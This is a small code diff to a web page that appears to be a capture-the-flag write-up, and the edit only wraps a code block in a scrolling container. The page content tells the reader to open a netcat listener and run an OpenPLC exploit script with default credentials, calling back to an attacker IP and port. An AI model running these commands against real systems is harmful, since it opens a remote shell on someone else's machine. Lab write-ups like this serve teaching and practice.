@@ -99,7 +99,9 @@ export default function Page() {
                 <SubPara content={'In the terminal. Type:'} />
                 <Code color="success">nc -lnvp 4444 (can use other port)</Code>
                 <SubPara content={'Other terminal.Run exploit code Type: '} />
-                <Code color="success">python 49803 -u http://&lt;host&gt;:8080 -l openplc -p openplc -i 10.10.14.18 -r 4444</Code>
+                <div className="overflow-x-auto">
+                    <Code color="success">python 49803 -u http://&lt;host&gt;:8080 -l openplc -p openplc -i 10.10.14.18 -r 4444</Code>
+                </div>
                 <SubImage img={{
                     alt: 'exploit 1',
                     path: '/images/wifinetictwo/exl1.png',
